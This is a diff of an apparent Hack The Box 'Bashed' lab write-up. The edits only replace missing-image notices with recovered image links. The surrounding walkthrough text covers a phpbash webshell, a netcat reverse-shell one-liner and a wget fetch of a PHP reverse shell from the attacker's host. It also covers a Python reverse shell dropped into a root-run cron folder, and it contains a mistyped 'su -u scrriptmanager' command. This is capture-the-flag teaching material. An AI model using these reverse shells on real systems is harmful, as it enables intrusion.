@@ -60,15 +60,15 @@ Access to `http://10.10.10.68`, and it seems to be a simple blog which talks abo
 
 Utilize the dirbuster to enumerate the directories.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/AgfJCd.png`
+![目录枚举结果](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-d5419d222f2a7cb394fe9672057b2a4c.jpeg)
 
 Wow. Find it and open the file `phpbash.php`. Here is the webshell. I have tried to reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f`. But the shell cannot be returned. Whatever, I can obtain the user.txt.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/AgfTPJ.png`
+![phpbash 访问结果](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-c439457e1ef8408cf6abdf3be1382013.jpeg)
 
 It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found [here](https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php). And I server the php script by `python -m SimpleHTTPServer 80`. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: `/tmp`.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/AghFMt.png`
+![上传反向 shell](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-3f30f06c5683338e29ddbb5cb72f6d77.jpeg)
 
 `wget http://10.10.16.44/php-reverse-shell.php`
 
@@ -78,13 +78,13 @@ Then in the kali, set the `nc` listen to port 1234:
 
 Execute the php script in the target machine `php php-reverse-shell.php`. OK. We obtain the reverse shell.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/AghBsx.png`
+![获得反向 shell](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-aefb1584033a0e261c69d39a290f1690.jpeg)
 
 ## Privilege escalation
 
 Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize `sudo -l` to see the permissions of the user. Something interesting found. We can switch to `scriptmanager` user without password.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/AghhQI.png`
+![切换 scriptmanager 用户](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-761cb2ccff8b621fc9f1306d381b992c.jpeg)
 
 ```
 su -u scrriptmanager bash -i
@@ -92,7 +92,7 @@ su -u scrriptmanager bash -i
 
 Try to enumerate the files. And I find an interesting folder inside `/scripts`. There are two files `test.py` and `test.txt`. Try to display the content of `test.py`.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/Ag4cn0.png`
+![test.py 定时任务](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-4fab395364e5f39d027b318354d871e7.jpeg)
 
 The python script is quite straightforward. It just writes `testing 123!` to the file `test.txt`. And if we see the attributes of `test.txt`, the modified time of the file changes each minute. And the file is owned by root. It seems that `root` will execute the python scripts in `/scripts` folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):
 
@@ -108,7 +108,7 @@ p=subprocess.call(["/bin/sh","-i"]);
 
 Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.
 
-> **（配图未能自动恢复）** 原地址：`https://s2.ax1x.com/2019/04/04/AghxO0.png`
+![获得 root shell](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/csdn-319cbc50e465764882005b216aefbb09.jpeg)
 
 ## 练习要点
 
